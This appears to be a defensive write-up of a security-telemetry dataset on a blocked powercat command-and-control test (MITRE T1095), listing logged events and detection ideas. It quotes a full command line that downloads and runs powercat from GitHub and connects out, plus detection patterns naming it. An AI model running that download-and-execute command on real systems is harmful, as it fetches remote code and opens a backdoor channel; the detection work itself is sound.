# T1095-3: Non-Application Layer Protocol — Powercat C2

## Technique Context

T1095 (Non-Application Layer Protocol) involves adversaries using network protocols that don't rely on application layer protocols for command and control communication. Instead of using HTTP/HTTPS, DNS, or other application-layer protocols, attackers leverage raw network sockets, custom protocols, or direct TCP/UDP connections to evade detection systems that focus on application-layer traffic analysis.

Powercat is a PowerShell implementation of netcat that enables adversaries to establish backdoor connections using raw TCP/UDP sockets. It's commonly used for establishing reverse shells, file transfers, and persistent C2 channels that bypass application-layer inspection. The detection community focuses on monitoring for suspicious network connections to unusual ports, PowerShell downloading tools from the internet, and the characteristic process injection behaviors that tools like powercat exhibit when establishing connections.

## What This Dataset Contains

This dataset captures a powercat C2 attempt that was blocked by Windows Defender. The key evidence shows:

**Process Creation Chain**: Security event 4688 reveals the full command line: `"powershell.exe" & {IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1') powercat -c 127.0.0.1 -p 80}` — this shows the classic pattern of downloading powercat from GitHub and immediately executing it to connect to localhost on port 80.

**Defender Intervention**: The spawned PowerShell process (PID 32180) exits with status `0xC0000022` (STATUS_ACCESS_DENIED), indicating Windows Defender blocked the execution.

**Network Activity Preparation**: Sysmon EID 7 events show urlmon.dll loading into all PowerShell processes, indicating preparation for web requests to download the powercat script.

**Process Injection Telemetry**: Sysmon EID 8 shows a CreateRemoteThread event from the PowerShell process into an unknown target process (PID 32180), and EID 10 shows process access with full rights (0x1FFFFF) — typical behavior when attempting to inject into or manipulate other processes for C2 operations.

**Execution Context**: All activity runs under NT AUTHORITY\SYSTEM, indicating high-privilege execution.

## What This Dataset Does Not Contain

**Successful Network Connections**: Since Defender blocked the technique, there are no Sysmon EID 3 (NetworkConnect) events showing the actual C2 connection establishment to 127.0.0.1:80.

**Powercat Script Content**: The download of the actual powercat.ps1 script was blocked, so there are no PowerShell script block logs (EID 4104) containing the powercat code itself — only test framework boilerplate remains.

**DNS Resolution**: No Sysmon EID 22 events for resolving raw.githubusercontent.com, likely because the connection was blocked before DNS resolution occurred.

**Successful C2 Communication**: No evidence of data exfiltration, command execution, or bidirectional communication that would occur in a successful powercat session.

**File Artifacts**: No Sysmon EID 11 events showing powercat.ps1 being written to disk, as the script execution was prevented.

## Assessment

This dataset provides excellent telemetry for detecting powercat C2 attempts, even when they're blocked. The Security channel's command-line logging captures the complete attack vector with the GitHub download URL and connection parameters. The Sysmon telemetry shows the process injection behaviors that occur before the network connection is established. However, the dataset's value is limited for understanding successful C2 operations since Defender's intervention prevents the technique from completing. The combination of command-line evidence and process behavior makes this highly valuable for building preventive detections.

## Detection Opportunities Present in This Data

1. **PowerShell GitHub Tool Downloads**: Detect PowerShell processes using `New-Object System.Net.Webclient` with `.Downloadstring()` methods targeting raw.githubusercontent.com, especially for known tools like powercat.

2. **Powercat Command Line Patterns**: Monitor for command lines containing "powercat -c" followed by IP addresses and port specifications, indicating C2 connection attempts.

3. **Process Injection from PowerShell**: Alert on Sysmon EID 8 (CreateRemoteThread) events where PowerShell processes inject into unknown or unexpected target processes.

4. **High-Privilege Network Tool Usage**: Detect PowerShell processes running as SYSTEM that load urlmon.dll while also exhibiting process injection behaviors.

5. **Defender STATUS_ACCESS_DENIED Correlation**: Monitor for PowerShell processes exiting with 0xC0000022 in conjunction with network tool command lines to identify blocked C2 attempts.

6. **PowerShell One-liner C2 Patterns**: Detect PowerShell execution with compressed command structures using `IEX` (Invoke-Expression) combined with web download functions and immediate tool execution.

7. **Cross-Process Handle Acquisition**: Monitor Sysmon EID 10 events where PowerShell processes acquire full access rights (0x1FFFFF) to other processes, indicating potential injection for C2 purposes.
